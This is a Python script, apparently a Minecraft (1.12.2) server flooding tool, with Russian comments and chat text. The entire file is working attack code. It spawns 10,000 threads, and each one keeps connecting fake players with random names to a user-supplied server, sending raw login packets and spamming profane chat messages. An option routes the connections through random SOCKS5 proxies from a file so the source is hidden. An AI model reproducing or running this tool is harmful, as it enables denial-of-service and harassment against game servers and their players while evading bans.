from threading import Thread
import random
import string
import socket
import socks
import time

'''bytez = [b'\x06\x00/\x00c\xdc\x02', b'\r\x00\x0bJustPastnix', b'%\x00\x17\x08REGISTERtxt:proto\x00MiniDot\x00Texteria', b'\x0c\x00\x15\x05ru_RU\x08\x00\x01\x7f'
,b'\x15\x00\x17\x08MC|Brand\tVimeWorld#\x00\x06@d0\x00\x00\x00\x00\x00@l \x00\x00\x00\x00\x00@Y`\x00\x00\x00\x00\x00C3\xd9\xa1?\xbf\xff|\x00'
,b'#\x00\x06@d0\x00\x00\x00\x00\x00@l \x00\x00\x00\x00\x00@Y`\x00\x00\x00\x00\x00C3\xd9\xa1?\xbf\xff|\x00'] # 1.8.X version '''

print("Дуст В4")

bytez = [b'\x0e\x00\xd4\x02\x070.0.0.0c\xdc\x02', b'\r\x00\x0bJustPastnix', b'\r\x00\x04\x05ru_ru\x04\x00\x01\x7f\x01', b'\x13\x00\t\x08MC|Brand\x07vanilla\x03\x00\x00\x00',
b'#\x00\x0e@d0\x00\x00\x00\x00\x00@l \x00\x00\x00\x00\x00@Y`\x00\x00\x00\x00\x00C5cs>\x89\xe20\x00'] # 1.12.2 version

HOST = input("Server ip: ")
SERVER_IP = HOST.split(":")[0]
SERVER_PORT = HOST.split(":")[1]

proxy_connection = False # Если использовать, то True

def get_random_proxy():
    with open("proxy.txt", 'r') as proxy:
        proxies = proxy.readlines()
    return random.choice(proxies).strip()

def generate_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def sendChatPacket(socket, message):
    part1_len = len(message) + 3
    part2_stat1 = b'\x00'
    part3_stat2 = b'\x01'
    part3_len2 = part1_len - 3
    packet = bytes([part1_len]) + part2_stat1 + part3_stat2 + bytes([part3_len2]) + message.encode('utf-8')
    socket.sendall(packet)

def send_bot_to_server():
    try:
        if proxy_connection:
            proxy_server = get_random_proxy()
            proxy_server, proxy_port = proxy_server.split(':')
            SOCKS5_proxy = proxy_server
            SOCKS5_proxy_port = int(proxy_port)

            socks.set_default_proxy(socks.SOCKS5, SOCKS5_proxy, SOCKS5_proxy_port)
            socket.socket = socks.socksocket

            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, int(SERVER_PORT)))
            print(f"Connected to server via SOCKS5 proxy {proxy_server}:{SOCKS5_proxy_port} successfully.")
            
            for packet in bytez:
                if b'JustPastnix' in packet:
                    random_string = generate_random_string(11).encode('utf-8')
                    substring_to_replace = b'JustPastnix'
                    packet = packet.replace(substring_to_replace, random_string)
                server_socket.sendall(packet)
                time.sleep(0.05)
            for message in range(10):
                sendChatPacket(server_socket, "дуст идёт нахуй")
                time.sleep(0.01)
        else:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, int(SERVER_PORT)))
            for packet in bytez:
                if b'JustPastnix' in packet:
                    random_string = generate_random_string(11).encode('utf-8')
                    substring_to_replace = b'JustPastnix'
                    packet = packet.replace(substring_to_replace, random_string)
                server_socket.sendall(packet)
                time.sleep(0.05)
                print("Дустим сервак без проксе нахуй")
            for message in range(10):
                sendChatPacket(server_socket, "дуст идёт нахуй")
                time.sleep(0.01)
    except Exception as e:
        server_socket.close()

def start():
    while True:
        send_bot_to_server()

for i in range(10000):
    Thread(target=start).start()